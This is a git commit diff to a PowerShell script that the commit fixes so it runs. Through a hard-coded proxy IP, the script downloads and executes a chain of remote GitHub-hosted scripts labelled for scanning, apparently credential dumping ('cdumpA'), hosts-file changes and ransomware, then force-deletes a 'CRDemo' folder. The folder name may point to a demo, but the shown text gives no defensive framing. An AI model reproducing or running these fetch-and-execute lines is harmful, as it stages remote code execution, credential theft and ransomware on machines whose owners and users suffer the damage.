c5daba7cdd6872392642418c7d85753e3c68977c
tameval <114147355+tameval@users.noreply.github.com>
2022-10-22 17:59:09 +0900

    Update init_124509.ps1

--- 124509/proxy/init_124509.ps1
+++ 124509/proxy/init_124509.ps1
@@ -6,15 +6,15 @@ $proxy_url = 'http://13.231.199.128:3128'; $web_client = New-Object System.Net.W
 IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/unzip_124509.ps1')
 
 #scanning
-IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scan_124509.ps1')"
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scan_124509.ps1')
 
 #cdumpA
-IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/cdumpa_124509.ps1')"
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/cdumpa_124509.ps1')
 
 #hosts
-IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/hosts_124509pr.ps1')"
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/hosts_124509pr.ps1')
 
 #ransom
-IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/ransom_124509.ps1')"
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/proxy/ransom_124509.ps1')
 
 Remove-Item C:\CRDemo -Recurse -Force
